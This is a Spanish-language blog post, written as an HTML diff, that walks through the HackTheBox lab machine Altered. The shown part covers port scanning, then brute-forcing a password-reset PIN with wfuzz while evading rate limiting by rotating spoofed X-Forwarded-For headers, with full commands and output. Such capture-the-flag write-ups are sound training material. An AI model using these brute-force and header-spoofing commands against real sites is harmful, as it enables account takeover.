@@ -1,0 +1,766 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Altered (hard) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - Altered (hard)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/hard/2024/10/20/altered.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/hard/2024/10/20/altered.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-10-20T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - Altered (hard)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-10-20T00:00:00-06:00","datePublished":"2024-10-20T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Altered (hard)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/hard/2024/10/20/altered.html"},"url":"http://localhost:4000/hackthebox/machines/hard/2024/10/20/altered.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Altered (hard)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-10-20T00:00:00-06:00" itemprop="datePublished">
+        Oct 20, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/a309dc491e50db28bf0f1ea691879b89.png" />
+</p>
+
+<ul>
+  <li>Further enchance your skills by exploring related academy modules.</li>
+</ul>
+
+<h2 id="portscan">PortScan</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.11.159 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-10-13 16:48 CST
+Nmap scan report <span class="k">for </span>10.10.11.159
+Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+| http-title: UHC March Finals
+|_Requested resource was http://10.10.11.159/login
+|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h2 id="enumeración">Enumeración</h2>
+
+<ul>
+  <li>Tenemos 2 puertos abiertos el puerto 22 que corresponde al servicio <code class="language-plaintext highlighter-rouge">ssh</code> y el puerto 80 que corresponde a un servicio <code class="language-plaintext highlighter-rouge">http</code> el cual esta corriendo una pagina web.</li>
+</ul>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.159</span>
+<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.159</span> <span class="p">[</span><span class="mi">302</span> <span class="no">Found</span><span class="p">]</span> <span class="no">Cookies</span><span class="p">[</span><span class="no">XSRF</span><span class="o">-</span><span class="no">TOKEN</span><span class="p">,</span><span class="n">laravel_session</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">][</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.18</span><span class="o">.</span><span class="mi">0</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.159</span><span class="p">],</span> <span class="no">Laravel</span><span class="p">,</span> <span class="no">Meta</span><span class="o">-</span><span class="no">Refresh</span><span class="o">-</span><span class="no">Redirect</span><span class="p">[</span><span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.159</span><span class="o">/</span><span class="n">login</span><span class="p">],</span> <span class="no">RedirectLocation</span><span class="p">[</span><span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.159</span><span class="o">/</span><span class="n">login</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">Redirecting</span> <span class="n">to</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.159</span><span class="o">/</span><span class="n">login</span><span class="p">],</span> <span class="no">UncommonHeaders</span><span class="p">[</span><span class="n">x</span><span class="o">-</span><span class="n">content</span><span class="o">-</span><span class="n">type</span><span class="o">-</span><span class="n">options</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Frame</span><span class="o">-</span><span class="no">Options</span><span class="p">[</span><span class="no">SAMEORIGIN</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.18</span><span class="o">.</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.159</span><span class="o">/</span><span class="n">login</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Cookies</span><span class="p">[</span><span class="no">XSRF</span><span class="o">-</span><span class="no">TOKEN</span><span class="p">,</span><span class="n">laravel_session</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">][</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.18</span><span class="o">.</span><span class="mi">0</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.159</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">[</span><span class="mf">1.9</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">Laravel</span><span class="p">,</span> <span class="no">PasswordField</span><span class="p">[</span><span class="n">password</span><span class="p">],</span> <span class="no">Script</span><span class="p">[</span><span class="n">text</span><span class="o">/</span><span class="n">javascript</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">UHC</span> <span class="no">March</span> <span class="no">Finals</span><span class="p">],</span> <span class="no">UncommonHeaders</span><span class="p">[</span><span class="n">x</span><span class="o">-</span><span class="n">content</span><span class="o">-</span><span class="n">type</span><span class="o">-</span><span class="n">options</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Frame</span><span class="o">-</span><span class="no">Options</span><span class="p">[</span><span class="no">SAMEORIGIN</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">UA</span><span class="o">-</span><span class="no">Compatible</span><span class="p">[</span><span class="no">IE</span><span class="o">=</span><span class="n">edge</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.18</span><span class="o">.</span><span class="mi">0</span><span class="p">]</span>
+</code></pre></div></div>
+
+<ul>
+  <li>La pagina web nos redirige a un panel de login.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/1.png" />
+</p>
+
+<ul>
+  <li>Si probamos con <code class="language-plaintext highlighter-rouge">admin:admin</code> no funciona pero si le damos en recuperar contraseña vemos que nos dicen que introduzcamos un PIN que nos envían al parecer por correo pero no tenemos acceso al correo.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/2.png" />
+</p>
+
+<ul>
+  <li>Si ponemos <code class="language-plaintext highlighter-rouge">PINs</code> incorrectos nos da este error.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/3.png" />
+</p>
+
+<ul>
+  <li>Tenemos 2 cookies.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/4.png" />
+</p>
+
+<h2 id="rate-limit-bypass">Rate-Limit Bypass</h2>
+
+<ul>
+  <li>Lo que podemos hacer es Fuerza bruta al <code class="language-plaintext highlighter-rouge">PIN</code> con <code class="language-plaintext highlighter-rouge">wfuzz</code> pero primero tenemos que capturar la petición a la hora de mandar el PIN para saber como esta viajando la data.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/5.png" />
+</p>
+
+<ul>
+  <li>Después de un cierto momento al parecer nos bloquean.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-t</span> 200 <span class="nt">-z</span> range,0000-9999 <span class="nt">-d</span> <span class="s1">'name=admin&amp;pin=FUZZ'</span> <span class="nt">-H</span> <span class="s2">"Cookie: XSRF-TOKEN=eyJpdiI6ImpCWXVEcURCbGRBMUxCZ3d2SjZrSlE9PSIsInZhbHVlIjoiY09uZG1JUGhpMnZtZFlwRDMzQzd2R2hoenFlZ0JwMzJhb3VsTzR0NmRPUk8vdm5DRkszMENJMHdSUHdhRUtEU0l3Y1JJbmMzY3FyRGtHQ0pUb2FiRXU4Q0ZpdWNueEhvemgwSkE3VTNDZTBKYVhFUDNQNU9MaXV1emJlS0FBekoiLCJtYWMiOiJjY2NkM2ZlNWEzNzU3MGEyNjZkNDNlY2RmYmE2MGEyMDFjZDU4MjlmNTRhYWQ0YTU0ZDRkYzc3Mjk1MDIwYTBmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InhFWnVudXJLVmhGM1IyWVFJbER0YkE9PSIsInZhbHVlIjoiWjIreGdWZGVoZDJtWmRiY0NGaEhraldmZE5KYVhuYzFIaWorWjQ4RXhUWitITTdnYk5HQW9uR0VTdjJVYVBjWEdLTXA3R3JzQjJIcVBCNzc5WmdoWFdDRVJXWEFHU1JzWTU0OHNlTXBIOVRJcVVuN0Q4eHRMUTRhSnB2eGQxdzkiLCJtYWMiOiIyZDQ2ZDhjZWQ0NTliY2M3NjQwNzE2ZjY5MDkxZGZkYjlkMTNkOTRkOTU1ODYwN2ZkZjZlMDljYTk5ZTE4N2U2IiwidGFnIjoiIn0%3D"</span> http://10.10.11.159/api/resettoken
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/altered/6.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Existen formas de hacer <code class="language-plaintext highlighter-rouge">Bypass</code> <a href="https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass">https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass</a> ya que al parecer si ve que estamos tramitando muchas peticiones desde una misma IP nos bloquea, vamos abusar de las cabeceras.</p>
+  </li>
+  <li>
+    <p>El problema de enviar esta petición es que se va a dar cuenta de que no es dinamico.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-t</span> 200 <span class="nt">-z</span> range,0000-9999 <span class="nt">-H</span> <span class="s2">"X-Originating-IP: 127.0.0.1"</span> <span class="nt">-d</span> <span class="s1">'name=admin&amp;pin=FUZZ'</span> <span class="nt">-H</span> <span class="s2">"Cookie: XSRF-TOKEN=eyJpdiI6ImpCWXVEcURCbGRBMUxCZ3d2SjZrSlE9PSIsInZhbHVlIjoiY09uZG1JUGhpMnZtZFlwRDMzQzd2R2hoenFlZ0JwMzJhb3VsTzR0NmRPUk8vdm5DRkszMENJMHdSUHdhRUtEU0l3Y1JJbmMzY3FyRGtHQ0pUb2FiRXU4Q0ZpdWNueEhvemgwSkE3VTNDZTBKYVhFUDNQNU9MaXV1emJlS0FBekoiLCJtYWMiOiJjY2NkM2ZlNWEzNzU3MGEyNjZkNDNlY2RmYmE2MGEyMDFjZDU4MjlmNTRhYWQ0YTU0ZDRkYzc3Mjk1MDIwYTBmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InhFWnVudXJLVmhGM1IyWVFJbER0YkE9PSIsInZhbHVlIjoiWjIreGdWZGVoZDJtWmRiY0NGaEhraldmZE5KYVhuYzFIaWorWjQ4RXhUWitITTdnYk5HQW9uR0VTdjJVYVBjWEdLTXA3R3JzQjJIcVBCNzc5WmdoWFdDRVJXWEFHU1JzWTU0OHNlTXBIOVRJcVVuN0Q4eHRMUTRhSnB2eGQxdzkiLCJtYWMiOiIyZDQ2ZDhjZWQ0NTliY2M3NjQwNzE2ZjY5MDkxZGZkYjlkMTNkOTRkOTU1ODYwN2ZkZjZlMDljYTk5ZTE4N2U2IiwidGFnIjoiIn0%3D"</span> http://10.10.11.159/api/resettoken
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Tendremos que crear un diccionario con diferentes <code class="language-plaintext highlighter-rouge">IPs</code>.</p>
+  </li>
+  <li>
+    <p>Mediante 2 bucles aninados vamos a crear el diccionario con las <code class="language-plaintext highlighter-rouge">IPs</code>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>0..40<span class="o">}</span><span class="p">;</span> <span class="k">do for </span>j <span class="k">in</span> <span class="o">{</span>0..253<span class="o">}</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"10.10.</span><span class="nv">$i</span><span class="s2">.</span><span class="nv">$j</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span> <span class="k">done</span> <span class="o">&gt;</span> IPs
+❯ <span class="nb">wc</span> <span class="nt">-l</span> IPs
+10414 IPs
+</code></pre></div></div>
+
+<ul>
+  <li>Si lo ejecutamos vemos que no esta iterando.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-t</span> 200 <span class="nt">-z</span> range,0000-9999 <span class="nt">-w</span> /home/miguelrega7/Hackthebox/altered/content/IPs <span class="nt">-H</span> <span class="s2">"X-Originating-IP: FUZ2Z"</span> <span class="nt">-d</span> <span class="s1">'name=admin&amp;pin=FUZZ'</span> <span class="nt">-H</span> <span class="s2">"Cookie: XSRF-TOKEN=eyJpdiI6ImpCWXVEcURCbGRBMUxCZ3d2SjZrSlE9PSIsInZhbHVlIjoiY09uZG1JUGhpMnZtZFlwRDMzQzd2R2hoenFlZ0JwMzJhb3VsTzR0NmRPUk8vdm5DRkszMENJMHdSUHdhRUtEU0l3Y1JJbmMzY3FyRGtHQ0pUb2FiRXU4Q0ZpdWNueEhvemgwSkE3VTNDZTBKYVhFUDNQNU9MaXV1emJlS0FBekoiLCJtYWMiOiJjY2NkM2ZlNWEzNzU3MGEyNjZkNDNlY2RmYmE2MGEyMDFjZDU4MjlmNTRhYWQ0YTU0ZDRkYzc3Mjk1MDIwYTBmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InhFWnVudXJLVmhGM1IyWVFJbER0YkE9PSIsInZhbHVlIjoiWjIreGdWZGVoZDJtWmRiY0NGaEhraldmZE5KYVhuYzFIaWorWjQ4RXhUWitITTdnYk5HQW9uR0VTdjJVYVBjWEdLTXA3R3JzQjJIcVBCNzc5WmdoWFdDRVJXWEFHU1JzWTU0OHNlTXBIOVRJcVVuN0Q4eHRMUTRhSnB2eGQxdzkiLCJtYWMiOiIyZDQ2ZDhjZWQ0NTliY2M3NjQwNzE2ZjY5MDkxZGZkYjlkMTNkOTRkOTU1ODYwN2ZkZjZlMDljYTk5ZTE4N2U2IiwidGFnIjoiIn0%3D"</span> http://10.10.11.159/api/resettoken
+<span class="k">********************************************************</span>
+<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
+<span class="k">********************************************************</span>
+
+Target: http://10.10.11.159/api/resettoken
+Total requests: 104140000
+
+<span class="o">=====================================================================</span>
+ID           Response   Lines    Word       Chars       Payload                                        
+<span class="o">=====================================================================</span>
+
+000000001:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.0"</span>                             
+000000003:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.2"</span>                             
+000000016:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.15"</span>                            
+000000019:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.18"</span>                            
+000000007:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.6"</span>                             
+000000020:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.19"</span>                            
+000000018:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.17"</span>                            
+000000015:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.14"</span>                            
+000000014:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.13"</span>                            
+000000009:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.8"</span>                             
+000000011:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.10"</span>                            
+000000017:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.16"</span>                            
+000000013:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.12"</span>                            
+000000064:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.63"</span>                            
+000000061:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.60"</span>                            
+000000059:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.58"</span>                            
+000000063:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.62"</span>                            
+000000062:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.61"</span>                            
+000000060:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.59"</span>                            
+000000057:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.56"</span>                            
+000000056:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.55"</span>                            
+000000054:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.53"</span>                            
+000000053:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.52"</span>                            
+000000050:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.49"</span>                            
+000000071:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.70"</span>                            
+000000069:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.68"</span>                            
+000000073:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.72"</span>                            
+000000058:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.57"</span>                            
+000000075:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.74"</span>                            
+000000070:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.69"</span>                            
+000000049:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.48"</span>                            
+000000052:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.51"</span>                            
+000000072:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.71"</span>                            
+000000048:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.47"</span>                            
+000000068:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.67"</span>                            
+000000051:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.50"</span>                            
+000000067:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.66"</span>                            
+000000082:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.81"</span>                            
+000000078:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.77"</span>                            
+000000076:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.75"</span>                            
+000000047:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.46"</span>                            
+000000045:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.44"</span>                            
+000000055:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.54"</span>                            
+000000090:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.89"</span>                            
+000000087:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.86"</span>                            
+000000086:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.85"</span>                            
+000000081:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.80"</span>                            
+000000077:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.76"</span>  
+</code></pre></div></div>
+
+<ul>
+  <li>Para que itere tenemos que usar el parámetro <code class="language-plaintext highlighter-rouge">-m</code> en <code class="language-plaintext highlighter-rouge">wfuzz</code> para que itere.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-m</span> zip <span class="nt">-t</span> 200 <span class="nt">-z</span> range,0000-9999 <span class="nt">-w</span> /home/miguelrega7/Hackthebox/altered/content/IPs <span class="nt">-H</span> <span class="s2">"X-Originating-IP: FUZ2Z"</span> <span class="nt">-d</span> <span class="s1">'name=admin&amp;pin=FUZZ'</span> <span class="nt">-H</span> <span class="s2">"Cookie: XSRF-TOKEN=eyJpdiI6ImpCWXVEcURCbGRBMUxCZ3d2SjZrSlE9PSIsInZhbHVlIjoiY09uZG1JUGhpMnZtZFlwRDMzQzd2R2hoenFlZ0JwMzJhb3VsTzR0NmRPUk8vdm5DRkszMENJMHdSUHdhRUtEU0l3Y1JJbmMzY3FyRGtHQ0pUb2FiRXU4Q0ZpdWNueEhvemgwSkE3VTNDZTBKYVhFUDNQNU9MaXV1emJlS0FBekoiLCJtYWMiOiJjY2NkM2ZlNWEzNzU3MGEyNjZkNDNlY2RmYmE2MGEyMDFjZDU4MjlmNTRhYWQ0YTU0ZDRkYzc3Mjk1MDIwYTBmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InhFWnVudXJLVmhGM1IyWVFJbER0YkE9PSIsInZhbHVlIjoiWjIreGdWZGVoZDJtWmRiY0NGaEhraldmZE5KYVhuYzFIaWorWjQ4RXhUWitITTdnYk5HQW9uR0VTdjJVYVBjWEdLTXA3R3JzQjJIcVBCNzc5WmdoWFdDRVJXWEFHU1JzWTU0OHNlTXBIOVRJcVVuN0Q4eHRMUTRhSnB2eGQxdzkiLCJtYWMiOiIyZDQ2ZDhjZWQ0NTliY2M3NjQwNzE2ZjY5MDkxZGZkYjlkMTNkOTRkOTU1ODYwN2ZkZjZlMDljYTk5ZTE4N2U2IiwidGFnIjoiIn0%3D"</span> http://10.10.11.159/api/resettoken
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Bueno si lo ejecutamos nos sigue bloqueando.</p>
+  </li>
+  <li>
+    <p>Vamos a cambiar las cabecera a esta.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-m</span> zip <span class="nt">-t</span> 200 <span class="nt">-z</span> range,0000-9999 <span class="nt">-w</span> /home/miguelrega7/Hackthebox/altered/content/IPs <span class="nt">-H</span> <span class="s2">"X-Forwarded-For: FUZ2Z"</span> <span class="nt">-d</span> <span class="s1">'name=admin&amp;pin=FUZZ'</span> <span class="nt">-H</span> <span class="s2">"Cookie: XSRF-TOKEN=eyJpdiI6ImpCWXVEcURCbGRBMUxCZ3d2SjZrSlE9PSIsInZhbHVlIjoiY09uZG1JUGhpMnZtZFlwRDMzQzd2R2hoenFlZ0JwMzJhb3VsTzR0NmRPUk8vdm5DRkszMENJMHdSUHdhRUtEU0l3Y1JJbmMzY3FyRGtHQ0pUb2FiRXU4Q0ZpdWNueEhvemgwSkE3VTNDZTBKYVhFUDNQNU9MaXV1emJlS0FBekoiLCJtYWMiOiJjY2NkM2ZlNWEzNzU3MGEyNjZkNDNlY2RmYmE2MGEyMDFjZDU4MjlmNTRhYWQ0YTU0ZDRkYzc3Mjk1MDIwYTBmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InhFWnVudXJLVmhGM1IyWVFJbER0YkE9PSIsInZhbHVlIjoiWjIreGdWZGVoZDJtWmRiY0NGaEhraldmZE5KYVhuYzFIaWorWjQ4RXhUWitITTdnYk5HQW9uR0VTdjJVYVBjWEdLTXA3R3JzQjJIcVBCNzc5WmdoWFdDRVJXWEFHU1JzWTU0OHNlTXBIOVRJcVVuN0Q4eHRMUTRhSnB2eGQxdzkiLCJtYWMiOiIyZDQ2ZDhjZWQ0NTliY2M3NjQwNzE2ZjY5MDkxZGZkYjlkMTNkOTRkOTU1ODYwN2ZkZjZlMDljYTk5ZTE4N2U2IiwidGFnIjoiIn0%3D"</span> http://10.10.11.159/api/resettoken
+</code></pre></div></div>
+
+<ul>
+  <li>No nos bloquea pero obtenemos respuestas iguales.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>000001471:   200        140 L    324 W      5644 Ch     <span class="s2">"1470 - 10.10.5.200"</span>                           
+000001474:   200        140 L    324 W      5644 Ch     <span class="s2">"1473 - 10.10.5.203"</span>                           
+000001490:   200        140 L    324 W      5644 Ch     <span class="s2">"1489 - 10.10.5.219"</span>                           
+000001478:   200        140 L    324 W      5644 Ch     <span class="s2">"1477 - 10.10.5.207"</span>                           
+000001502:   200        140 L    324 W      5644 Ch     <span class="s2">"1501 - 10.10.5.231"</span>                           
+000001501:   200        140 L    324 W      5644 Ch     <span class="s2">"1500 - 10.10.5.230"</span>                           
+000001477:   200        140 L    324 W      5644 Ch     <span class="s2">"1476 - 10.10.5.206"</span>                           
+000001500:   200        140 L    324 W      5644 Ch     <span class="s2">"1499 - 10.10.5.229"</span>                           
+000001496:   200        140 L    324 W      5644 Ch     <span class="s2">"1495 - 10.10.5.225"</span>                           
+000001504:   200        140 L    324 W      5644 Ch     <span class="s2">"1503 - 10.10.5.233"</span>                           
+000001497:   200        140 L    324 W      5644 Ch     <span class="s2">"1496 - 10.10.5.226"</span>                           
+000001503:   200        140 L    324 W      5644 Ch     <span class="s2">"1502 - 10.10.5.232"</span>                           
+000001499:   200        140 L    324 W      5644 Ch     <span class="s2">"1498 - 10.10.5.228"</span>                           
+000001495:   200        140 L    324 W      5644 Ch     <span class="s2">"1494 - 10.10.5.224"</span>                           
+000001498:   200        140 L    324 W      5644 Ch     <span class="s2">"1497 - 10.10.5.227"</span>                           
